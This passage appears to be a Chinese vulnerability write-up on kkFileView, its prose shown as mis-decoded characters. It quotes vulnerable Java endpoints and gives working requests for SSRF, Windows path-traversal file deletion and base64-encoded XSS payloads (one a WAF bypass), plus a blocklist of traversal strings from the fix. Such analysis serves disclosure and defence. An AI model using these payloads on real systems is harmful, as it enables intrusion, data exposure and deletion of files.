class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®urlè·å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line"><span class="comment"> * å½“pdfjsè¯»å–å­˜åœ¨è·¨åŸŸé—®é¢˜çš„æ–‡ä»¶æ—¶å°†é€šè¿‡æ­¤æ¥å£è¯»å–</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> urlPath  url</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> response response</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/getCorsFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getCorsFile</span><span class="params">(String urlPath, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (urlPath == <span class="literal">null</span> || urlPath.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        logger.info(<span class="string">&quot;URLå¼‚å¸¸ï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">        response.setStatus(HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html; charset=UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;NULLåœ°å€ä¸å…è®¸é¢„è§ˆ&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        urlPath = WebUtils.decodeUrl(urlPath);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        logger.error(String.format(BASE64_DECODE_ERROR_MSG, urlPath),ex);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    HttpURLConnection urlcon;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlPath.toLowerCase().startsWith(<span class="string">&quot;file:&quot;</span>) || urlPath.toLowerCase().startsWith(<span class="string">&quot;file%3&quot;</span>)) &#123;</span><br><span class="line">        logger.info(<span class="string">&quot;è¯»å–è·¨åŸŸæ–‡ä»¶å¼‚å¸¸ï¼Œå¯èƒ½å­˜åœ¨éæ³•è®¿é—®ï¼ŒurlPathï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    logger.info(<span class="string">&quot;ä¸‹è½½è·¨åŸŸpdfæ–‡ä»¶urlï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">if</span> (!urlPath.toLowerCase().startsWith(<span class="string">&quot;ftp:&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">            urlcon=(HttpURLConnection)url.openConnection();</span><br><span class="line">            urlcon.setConnectTimeout(<span class="number">30000</span>);</span><br><span class="line">            urlcon.setReadTimeout(<span class="number">30000</span>);</span><br><span class="line">            urlcon.setInstanceFollowRedirects(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (urlcon.getResponseCode() == <span class="number">302</span> || urlcon.getResponseCode() == <span class="number">301</span>) &#123;</span><br><span class="line">                urlcon.disconnect();</span><br><span class="line">                url =<span class="keyword">new</span> <span class="title class_">URL</span>(urlcon.getHeaderField(<span class="string">&quot;Location&quot;</span>));</span><br><span class="line">                urlcon=(HttpURLConnection)url.openConnection();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (urlcon.getResponseCode() == <span class="number">404</span> || urlcon.getResponseCode() == <span class="number">403</span> || urlcon.getResponseCode() == <span class="number">500</span> ) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;è¯»å–è·¨åŸŸæ–‡ä»¶å¼‚å¸¸ï¼Œurlï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">                <span class="keyword">return</span> ;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(urlPath.contains( <span class="string">&quot;.svg&quot;</span>)) &#123;</span><br><span class="line">                    response.setContentType(<span class="string">&quot;image/svg+xml&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                inputStream=(url).openStream();</span><br><span class="line">                IOUtils.copy(inputStream, response.getOutputStream());</span><br><span class="line">                urlcon.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;è¯»å–è·¨åŸŸæ–‡ä»¶å¼‚å¸¸ï¼Œurlï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            IOUtils.closeQuietly(inputStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> WebUtils.normalizedURL(urlPath);</span><br><span class="line">            <span class="keyword">if</span>(urlPath.contains(<span class="string">&quot;.svg&quot;</span>)) &#123;</span><br><span class="line">                response.setContentType(<span class="string">&quot;image/svg+xml&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            inputStream = (url).openStream();</span><br><span class="line">            IOUtils.copy(inputStream, response.getOutputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | GalimatiasParseException e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;è¯»å–è·¨åŸŸæ–‡ä»¶å¼‚å¸¸ï¼Œurlï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            IOUtils.closeQuietly(inputStream);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>cn.keking.utils.WebUtils#decodeUrl</code>æ–¹æ³•è¿›è¡Œä¸€æ¬¡base64è§£ç </p><p><img src="https://s2.loli.net/2024/12/20/GXFtJzoi4TDl3k7.png" alt="img"></p><p>è™½ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>url:</code>å‰ç¼€ç»•è¿‡è¿™é‡Œçš„ifåˆ¤æ–­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (urlPath.toLowerCase().startsWith(<span class="string">&quot;file:&quot;</span>) || urlPath.toLowerCase().startsWith(<span class="string">&quot;file%3&quot;</span>)) &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;è¯»å–è·¨åŸŸæ–‡ä»¶å¼‚å¸¸ï¼Œå¯èƒ½å­˜åœ¨éæ³•è®¿é—®ï¼ŒurlPathï¼š&#123;&#125;&quot;</span>, urlPath);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯åé¢çš„é€»è¾‘æ˜¯å°†<code>java.net.URLConnection</code>ç±»å‹è½¬æ¢ä¸º<code>java.net.HttpURLConnection</code>ï¼Œè€Œfileåè®®ä¸æ”¯æŒè¿™ä¸ªç±»å‹è½¬æ¢ä¼šæŠ¥é”™</p><p><img src="https://s2.loli.net/2024/12/20/rWTvAf52thYz1CU.png" alt="img"></p><p>å¦‚æœèƒ½åœ¨<code>URL url = WebUtils.normalizedURL(urlPath);</code>å¤„ç†ä¹‹åå°†<code>ftp:</code>å¼€å¤´çš„urlPathï¼Œæœ€åé€šè¿‡æŸç§å¤„ç†é€ æˆçš„å·®å¼‚è½¬æ¢ä¸ºfileåè®®ï¼Œå³å¯åœ¨elseéƒ¨åˆ†è°ƒç”¨<code>java.net.URL#openStream</code>æˆåŠŸç»•è¿‡ï¼Œä½†ç›®å‰åªæ˜¯ä¸€ä¸ªæƒ³æ³•ï¼Œå®é™…å¹¶æœªå‘ç°è¿™æ ·çš„å·®å¼‚</p><p>è€Œåƒgopherç­‰åè®®ï¼Œå±äºæ˜¯<code>galimatias</code> åº“çš„ <code>URL</code>ç±»æ”¯æŒè¯¥åè®®è€Œ Java8 åŸç”Ÿçš„URLç±»ä¸è®¤å¾—ï¼ˆåœ¨jdk8ç‰ˆæœ¬ä»¥åè¢«é˜‰å‰²äº†ï¼Œjdk7é«˜ç‰ˆæœ¬è™½ç„¶å­˜åœ¨ï¼Œä½†æ˜¯éœ€è¦è®¾ç½®ï¼‰</p><p><a href="https://bugzilla.redhat.com/show_bug.cgi?id=865541">https://bugzilla.redhat.com/show_bug.cgi?id=865541</a></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote><p>kkFileView &lt;&#x3D; v3.6.0, &lt;&#x3D; v4.4.0-beta</p></blockquote><h3 id="å¤ç°-2"><a href="#å¤ç°-2" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>kkFileView &lt;&#x3D; 3.6.0, &lt;&#x3D; 4.0.0</p><p><img src="https://s2.loli.net/2024/12/20/RzyKhpMPOLJoIk1.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/PEv4Ciq2JsXMAO8.png" alt="img"></p><p>4.1.0 &lt;&#x3D; kkFileView &lt;&#x3D; 4.4.0-beta</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getCorsFile?urlPath=aHR0cHM6Ly93d3cuYmFpZHUuY29tLw==</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/QH9qM6DwcRmFEpT.png" alt="img"></p><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>æ ¹æ®ä¸Šé¢çš„åˆ†æä¹Ÿå¾ˆå®¹æ˜“ç†è§£ä¸ºä»€ä¹ˆå­˜åœ¨SSRFï¼Œ4.1.0åœ¨ä¿®å¤ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„æ—¶å€™åªå¯¹fileåè®®åšäº†ä¸€å®šè¿‡æ»¤ï¼Œè€ŒHTTPåè®®å’ŒHTTPSåè®®å¹¶æœªå—å½±å“</p><h3 id="ä¿®å¤-2"><a href="#ä¿®å¤-2" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>ç»è¿‡å°è¯•4.4.0-betaä¹Ÿæ˜¯èƒ½SSRFçš„ï¼Œ</p><p><img src="https://s2.loli.net/2024/12/20/hjw7UAVpCSGFMPv.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/uF7Dk6yMAL8xtmH.png" alt="img"></p><p>ä½†æ˜¯å®˜æ–¹ç»™çš„é¢„è§ˆç½‘ç«™æ— æ³•æˆåŠŸï¼Œä¼°è®¡æ˜¯æŸä¸ªé…ç½®é¡¹å¯ä»¥é…ç½®</p><p><a href="https://github.com/kekingcn/kkFileView/issues/392">https://github.com/kekingcn/kkFileView/issues/392</a></p><p><img src="https://s2.loli.net/2024/12/20/3FyzfNmwGrApj9E.png" alt="img"></p><p>æ¯”å¦‚è¿™ä¸ªå¯ä»¥é™åˆ¶å…è®¸é¢„è§ˆçš„æœ¬åœ°æ–‡ä»¶å¤¹</p><p><a href="https://github.com/kekingcn/kkFileView/pull/309/commits/9d65c999e5e7a98f9e68f76757977fefa13b72ac">https://github.com/kekingcn/kkFileView/pull/309/commits/9d65c999e5e7a98f9e68f76757977fefa13b72ac</a></p><h2 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h2><blockquote><p>kkFileView &#x3D;&#x3D; v4.0.0 ï¼ˆä»…åœ¨windowsç¯å¢ƒä¸‹æˆåŠŸï¼‰</p></blockquote><h3 id="å¤ç°-3"><a href="#å¤ç°-3" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>åˆ›å»ºä¸€ä¸ªç›®å½•ç”¨äºå­˜æ”¾ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶åœ¨é…ç½®é¡¹ä¸­æŒ‡å®šè¿™ä¸ªç›®å½•</p><p><img src="https://s2.loli.net/2024/12/20/TuNDGXCaPr4ytbo.png" alt="img"></p><p>åˆ›å»ºåœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªpoc.txtç”¨äºæ£€éªŒç›®å½•æˆåŠŸç©¿è¶Šï¼ˆæ­£å¸¸åªèƒ½åˆ é™¤demoç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰</p><p><img src="https://s2.loli.net/2024/12/20/4sJgYut5wyc1RND.png" alt="img"></p><p>ç„¶åGETè¯·æ±‚<code>/deleteFile?fileName=demo%2F..\poc.txt</code></p><p><img src="https://s2.loli.net/2024/12/20/xX7LfzhwSmUbiuq.png" alt="img"></p><p><img src="https://s2.loli.net/2024/12/20/j4x9DkpeagzWhKr.png" alt="img"></p><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶æˆåŠŸè¢«åˆ é™¤</p><h3 id="åˆ†æ-3"><a href="#åˆ†æ-3" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>éå¸¸ç®€å•çš„é”å®šè·¯ç”±</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;deleteFile&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">deleteFile</span><span class="params">(String fileName)</span> <span class="keyword">throws</span> JsonProcessingException &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileDir + demoPath + fileName);</span><br><span class="line">    logger.info(<span class="string">&quot;åˆ é™¤æ–‡ä»¶ï¼š&#123;&#125;&quot;</span>, file.getAbsolutePath());</span><br><span class="line">    <span class="keyword">if</span> (file.exists() &amp;&amp; !file.delete()) &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;åˆ é™¤æ–‡ä»¶ã€&#123;&#125;ã€‘å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç›®å½•æƒé™ï¼&quot;</span>,file.getPath());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>().writeValueAsString(ReturnResponse.success());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°é¦–å…ˆä¼šå¯¹ä¼ å…¥çš„fileNameå‚æ•°è¿›è¡Œå¤„ç†ï¼Œåªä¿ç•™æœ€åä¸€ä¸ª<code>/</code>åçš„å†…å®¹ï¼Œä½†Windowsæ”¯æŒ<code>\</code>è·¯å¾„åˆ†éš”ç¬¦ï¼Œäºæ˜¯å¯ä»¥åˆ©ç”¨<code>..\</code>ç›®å½•ç©¿è¶Šï¼Œä»è€Œè¾¾åˆ°ä»»æ„æ–‡ä»¶åˆ é™¤çš„å±å®³</p><p><img src="https://s2.loli.net/2024/12/20/UAMcmLS3gHYPyvs.png" alt="img"></p><h3 id="ä¿®å¤-3"><a href="#ä¿®å¤-3" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>åœ¨v4.1.0çš„ä»£ç ä¸­åŠ å…¥äº†é»‘åå•è¿‡æ»¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/deleteFile&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ReturnResponse&lt;Object&gt; <span class="title function_">deleteFile</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileName == <span class="literal">null</span> || fileName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(<span class="string">&quot;æ–‡ä»¶åä¸ºç©ºï¼Œåˆ é™¤å¤±è´¥ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileName = URLDecoder.decode(fileName, StandardCharsets.UTF_8.name());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fileName.contains(<span class="string">&quot;/&quot;</span>)) &#123;</span><br><span class="line">        fileName = fileName.substring(fileName.lastIndexOf(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (KkFileUtils.isIllegalFileName(fileName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(<span class="string">&quot;éæ³•æ–‡ä»¶åï¼Œåˆ é™¤å¤±è´¥ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(fileDir + demoPath + fileName);</span><br><span class="line">    logger.info(<span class="string">&quot;åˆ é™¤æ–‡ä»¶ï¼š&#123;&#125;&quot;</span>, file.getAbsolutePath());</span><br><span class="line">    <span class="keyword">if</span> (file.exists() &amp;&amp; !file.delete()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> String.format(<span class="string">&quot;åˆ é™¤æ–‡ä»¶ã€%sã€‘å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç›®å½•æƒé™ï¼&quot;</span>, file.getPath());</span><br><span class="line">        logger.error(msg);</span><br><span class="line">        <span class="keyword">return</span> ReturnResponse.failure(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ReturnResponse.success();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; illegalFileStrList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;..\\&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;.\\&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;\\..&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">    illegalFileStrList.add(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çœç•¥ä¸­é—´çš„ä»£ç </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åˆè§„</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> fileName æ–‡ä»¶å</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> åˆè§„ç»“æœ,true:ä¸åˆè§„ï¼Œfalse:åˆè§„</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isIllegalFileName</span><span class="params">(String fileName)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (String str: illegalFileStrList)&#123;</span><br><span class="line">        <span class="keyword">if</span>(fileName.contains(str))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤çš„è¿˜æ˜¯éå¸¸ä¸¥æ ¼çš„ï¼Œç›´æ¥ç»™å µæ­»äº†</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><blockquote><p>&#x2F;picturesPreview                              kkFileView &lt;&#x3D; 4.1.0</p><p>&#x2F;onlinePreview                                 kkFileView &lt;&#x3D; 4.1.0</p></blockquote><h3 id="å¤ç°-4"><a href="#å¤ç°-4" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>ç¬¬ä¸€å¤„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=aHR0cDovL3d3dy5iYWlkdS5jb20vdGVzdC50eHQiPjxpbWcgc3JjPTExMSBvbmVycm9yPWFsZXJ0KDEpPg%3D%3D</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/tJDaq87XCKmkZNd.png" alt="img"></p><p>ç¬¬äºŒå¤„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=&amp;currentUrl=Iik7YWxlcnQoIjExMQ==</span><br></pre></td></tr></table></figure><p>2024.09.04 ä»Šå¤©ç»•è¿‡äº†ä¸ªWAFï¼Œè®°å½•ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/picturesPreview?urls=&amp;currentUrl=PC9wPjwvc3Bhbj48L3N0eWxlICYjMzI7PjxzY3JpcHQgJiMzMjsgOi0oPi8qKi9hbGVydCg3NzYpLyoqLzwvc2NyaXB0ICYjMzI7IDotKDxzcGFuPjxwPg%3d%3d</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/Oj5eMQEs3gaChdY.png" alt="img"></p><p>ç¬¬ä¸‰å¤„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/onlinePreview?url=aHR0cDovLyI%2BPHN2Zy9vbmxvYWQ9IndpbmRvdy5vbmVycm9yPWV2YWw7dGhyb3cnPWFsZXJ0XHgyODFceDI5JzsiPi90ZXN0LnBuZw%3D%3D</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/20/VPeiFf6HQAGuyT3.png" alt="img"></p><h3 id="åˆ†æ-4"><a href="#åˆ†æ-4" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>&#x2F;picturesPreview</p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°†ä¼ å…¥çš„urlsè¿›è¡Œbase64è§£ç åæ·»åŠ åˆ°äº†modelä¸­</p><p><img src="https://s2.loli.net/2024/12/20/xNyQrwgtOchqdX4.png" alt="img"></p><p>è€Œå…¨å±€ç”¨äº†freemarkeræ¨¡æ¿æ¸²æŸ“ï¼Œæœªç»å¤„ç†ç›´æ¥æ‹¼æ¥åˆ°äº†htmlä¸­</p><p><img src="https://s2.loli.net/2024/12/20/Ray8LiSOh3dnxFj.png" alt="img"></p><p>å¾ˆæ˜æ˜¾å­˜åœ¨XSSç¼ºé™·ã€‚currentUrlä¹Ÿæ˜¯ç±»ä¼¼è¿™æ ·ï¼Œå¯ä»¥æ‹¼æ¥åƒ<code>&quot;);alert(&quot;111</code>ä¸€æ ·é—­åˆï¼Œä»è€Œæ‰§è¡Œä»»æ„jsä»£ç </p><p><img src="https://s2.loli.net/2024/12/20/bzTcAw8JLV1Dptd.png" alt="img"></p><p>&#x2F;onlinePreview</p><p>è¿™ä¸ªç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œæ²¡é‚£ä¹ˆæ˜æ˜¾</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping( &quot;/onlinePreview&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">onlinePreview</span><span class="params">(String url, Model model, HttpServletRequest req)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (url == <span class="literal">null</span> || url.length() == <span class="number">0</span>)&#123;</span><br><span class="line">        logger.info(<span class="string">&quot;URLå¼‚å¸¸ï¼š&#123;&#125;&quot;</span>, url);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, <span class="string">&quot;NULLåœ°å€ä¸å…è®¸é¢„è§ˆ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String fileUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        fileUrl = WebUtils.decodeUrl(url);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">errorMsg</span> <span class="operator">=</span> String.format(BASE64_DECODE_ERROR_MSG, <span class="string">&quot;url&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> otherFilePreview.notSupportedFile(model, errorMsg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">FileAttribute</span> <span class="variable">fileAttribute</span> <span class="operator">=</span> fileHandlerService.getFileAttribute(fileUrl, req);</span><br><span class="line">    model.addAttribute(<span class="string">&quot;file&quot;</span>, fileAttribute);</span><br><span class="line">    <span class="type">FilePreview</span> <span class="variable">filePreview</span> <span class="operator">=</span> 